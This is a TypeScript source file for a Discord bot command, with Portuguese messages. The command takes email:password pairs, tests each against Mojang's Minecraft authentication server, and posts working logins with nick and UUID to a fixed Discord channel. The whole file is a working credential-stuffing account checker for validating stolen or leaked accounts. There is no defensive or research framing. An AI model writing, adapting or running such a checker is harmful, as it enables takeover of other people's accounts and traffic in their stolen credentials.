import { Message, MessageEmbed, Permissions, TextChannel } from "discord.js";
import BaseCommand from "../BaseCommand";
import fetch from "node-fetch";
export default class CheckerCommand implements BaseCommand {
    execute(message: Message, args: string[]) {
        if (args.length < 1) {
            message.reply("Use: !checkar [email:senha]")
            return
        }
        (async () => {
            let contas = args.join("\n").split("\n")
            let funcionando: string[] = []
            let nao_funcionando: string[] = []
            message.reply("Checkando as contas: " + contas)
            for (let data of contas) {
                try {
                    const email = data.split(":")[0]
                    const password = data.split(":")[1]
                    let payload = {
                        "agent": {
                            "name": "Minecraft",
                            "version": 1

                        },
                        "username": email,

                        "password": password,
                        "clientToken": "client identifier",
                        "requestUser": true
                    }
                    const res = await fetch("https://authserver.mojang.com/authenticate", {
                        "method": "POST",
                        "body": JSON.stringify(payload),
                        headers: {
                            'Accept': 'application/json',
                            'Content-Type': 'application/json'
                        }
                    })
                    const json = await res.json()
                    console.log(json)
                    if (json["accessToken"]) {
                        let nick = json["selectedProfile"]["name"];
                        let uuid = json["selectedProfile"]["id"];
                        (message.guild.channels.cache.get("902332034788257853") as TextChannel).send(`Email: ${email}
                        Senha: ${password}\nNick: ${nick}\nUUID: ${uuid}`)
                    } else {
                        message.reply("Conta não funcionando: "+`${email}:${password}`)
                    }
                } catch (ex) {
                    message.reply("**Conta inválida detectada: " + data + "**")
                }
            }
        })()
    }
    getPermission(): bigint {
        return Permissions.FLAGS.ADMINISTRATOR
    }
    getName(): string {
        return "checkar"
    }
    getAliases(): string[] {
        return []
    }

}